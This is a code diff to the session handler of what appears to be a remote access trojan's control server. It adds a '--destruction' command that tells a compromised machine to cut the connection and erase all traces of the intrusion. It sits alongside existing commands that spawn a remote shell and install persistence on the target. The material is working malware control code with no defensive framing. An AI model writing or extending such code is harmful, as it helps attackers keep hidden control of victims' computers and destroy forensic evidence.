@@ -80,9 +80,8 @@ class Session:
 
     def spawnShell(self,prog):
         '''--command or --powershell'''
-
         #Opens a shell on the remote machine. 
-        #?????????????????????????????????????????????????????????????????????? WHERE IS SELECT !!
+
         printColor("information","\n[?] Execute -b or --back or exit to return to sessions mode.\n\n") 
         
         if(CheckConn().sendsafe(self.session_nb, self.socket, "MOD_SPAWN_SHELL:"+prog) ):
@@ -106,7 +105,21 @@ class Session:
                 printColor("error","[-] the persistence mod could not be executed on the client.")
 
         else:
-            printColor("information","[+] the persistence mod was not sent.\n")
+            printColor("error","[+] the persistence mod was not sent.\n")
+
+    
+    def lonelyDestruction(self):
+        '''-d or --destruction '''
+        #send MOD_DESTRUCTION | stop the connection and then remove all traces on the target machine.
+
+        mod_destruction  = "MOD_DESTRUCTION:"
+        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
+            
+            reponse = CheckConn().recvsafe(self.socket, 4096)
+            printColor("information",reponse)
+        
+        else:
+            printColor("error", "[+] the destruction mod was not sent.\n")
 
 
     def printInformation(self):
@@ -140,6 +153,9 @@ class Session:
                     elif terminal[i] == "-p" or terminal[i] == "--persistence":
                         self.lonelyPersistence()
                     
+                    elif terminal[i] == "-d" or terminal[i] == "--destruction":
+                        self.lonelyDestruction()
+
                     else:
                         pass
                     
@@ -147,6 +163,7 @@ class Session:
                     pass
                     #print("CHHHED")
                     #print(i)
-                
+
+
         printColor("information","[-] The session was cut, back to menu.") #If the session close.
         printColor("information","[-] Back to the server menu.\n")
